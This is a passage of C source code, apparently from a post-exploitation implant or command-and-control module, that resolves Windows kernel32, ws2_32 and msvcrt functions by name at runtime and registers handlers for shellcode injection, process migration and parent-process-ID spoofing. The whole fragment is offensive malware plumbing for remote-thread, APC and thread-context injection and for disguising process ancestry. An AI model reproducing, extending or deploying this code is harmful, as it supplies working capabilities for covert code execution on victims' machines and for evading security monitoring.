    w.pOpenProcess              = (fn_OpenProcess)cot_resolve("kernel32.dll",
                                                              "OpenProcess");
    w.pVirtualAllocEx           = (fn_VirtualAllocEx)cot_resolve("kernel32.dll",
                                                                  "VirtualAllocEx");
    w.pWriteProcessMemory       = (fn_WriteProcessMemory)cot_resolve("kernel32.dll",
                                                                      "WriteProcessMemory");
    w.pVirtualProtectEx         = (fn_VirtualProtectEx)cot_resolve("kernel32.dll",
                                                                    "VirtualProtectEx");
    w.pVirtualFreeEx            = (fn_VirtualFreeEx)cot_resolve("kernel32.dll",
                                                                 "VirtualFreeEx");
    w.pCloseHandle              = (fn_CloseHandle)cot_resolve("kernel32.dll",
                                                               "CloseHandle");
    w.pGetLastError             = (fn_GetLastError)cot_resolve("kernel32.dll",
                                                                "GetLastError");
    w.pGetModuleHandleA         = (fn_GetModuleHandleA)cot_resolve("kernel32.dll",
                                                                    "GetModuleHandleA");
    w.pGetProcAddress           = (fn_GetProcAddress)cot_resolve("kernel32.dll",
                                                                  "GetProcAddress");
    w.pCreateProcessA           = (fn_CreateProcessA)cot_resolve("kernel32.dll",
                                                                  "CreateProcessA");

    /* ---- kernel32.dll — inject_tech.h ---- */
    w.pCreateToolhelp32Snapshot = (fn_CreateToolhelp32Snapshot)cot_resolve("kernel32.dll",
                                                                           "CreateToolhelp32Snapshot");
    w.pThread32First            = (fn_Thread32First)cot_resolve("kernel32.dll",
                                                                 "Thread32First");
    w.pThread32Next             = (fn_Thread32Next)cot_resolve("kernel32.dll",
                                                                "Thread32Next");
    w.pOpenThread               = (fn_OpenThread)cot_resolve("kernel32.dll",
                                                              "OpenThread");
    w.pGetCurrentProcessId      = (fn_GetCurrentProcessId)cot_resolve("kernel32.dll",
                                                                       "GetCurrentProcessId");
    w.pCreateRemoteThread       = (fn_CreateRemoteThread)cot_resolve("kernel32.dll",
                                                                      "CreateRemoteThread");
    w.pSuspendThread            = (fn_SuspendThread)cot_resolve("kernel32.dll",
                                                                 "SuspendThread");
    w.pResumeThread             = (fn_ResumeThread)cot_resolve("kernel32.dll",
                                                                "ResumeThread");
    w.pQueueUserAPC             = (fn_QueueUserAPC)cot_resolve("kernel32.dll",
                                                                "QueueUserAPC");
    w.pGetThreadContext         = (fn_GetThreadContext)cot_resolve("kernel32.dll",
                                                                   "GetThreadContext");
    w.pSetThreadContext         = (fn_SetThreadContext)cot_resolve("kernel32.dll",
                                                                   "SetThreadContext");

    /* ---- kernel32.dll — migrate ---- */
    w.pGetCurrentProcess        = (fn_GetCurrentProcess)cot_resolve("kernel32.dll",
                                                                     "GetCurrentProcess");
    w.pDuplicateHandle          = (fn_DuplicateHandle)cot_resolve("kernel32.dll",
                                                                    "DuplicateHandle");
    w.pCreateFileMappingA       = (fn_CreateFileMappingA)cot_resolve("kernel32.dll",
                                                                      "CreateFileMappingA");
    w.pMapViewOfFile            = (fn_MapViewOfFile)cot_resolve("kernel32.dll",
                                                                 "MapViewOfFile");
    w.pUnmapViewOfFile          = (fn_UnmapViewOfFile)cot_resolve("kernel32.dll",
                                                                    "UnmapViewOfFile");
    w.pTerminateProcess         = (fn_TerminateProcess)cot_resolve("kernel32.dll",
                                                                    "TerminateProcess");

    /* ---- kernel32.dll — ppid_spoof ---- */
    w.pInitializeProcThreadAttributeList = (fn_InitializeProcThreadAttributeList)cot_resolve("kernel32.dll",
                                                                                             "InitializeProcThreadAttributeList");
    w.pUpdateProcThreadAttribute         = (fn_UpdateProcThreadAttribute)cot_resolve("kernel32.dll",
                                                                                     "UpdateProcThreadAttribute");
    w.pDeleteProcThreadAttributeList     = (fn_DeleteProcThreadAttributeList)cot_resolve("kernel32.dll",
                                                                                         "DeleteProcThreadAttributeList");

    /* ---- ws2_32.dll — migrate ---- */
    w.pWSADuplicateSocketW      = (fn_WSADuplicateSocketW)cot_resolve("ws2_32.dll",
                                                                       "WSADuplicateSocketW");
    w.pWSAGetLastError          = (fn_WSAGetLastError)cot_resolve("ws2_32.dll",
                                                                   "WSAGetLastError");

    /* ---- msvcrt.dll — migrate ---- */
    w.pvsnprintf                = (fn_vsnprintf)cot_resolve("msvcrt.dll",
                                                             "vsnprintf");

    /* Register handlers */
    api_call_register(api_calls, INJECT_SHELLCODE, (api_t)inject_shellcode);
    api_call_register(api_calls, MIGRATE_LOAD,     (api_t)migrate_load);
    api_call_register(api_calls, PPID_SPAWN,       (api_t)ppid_spawn);
}

#endif
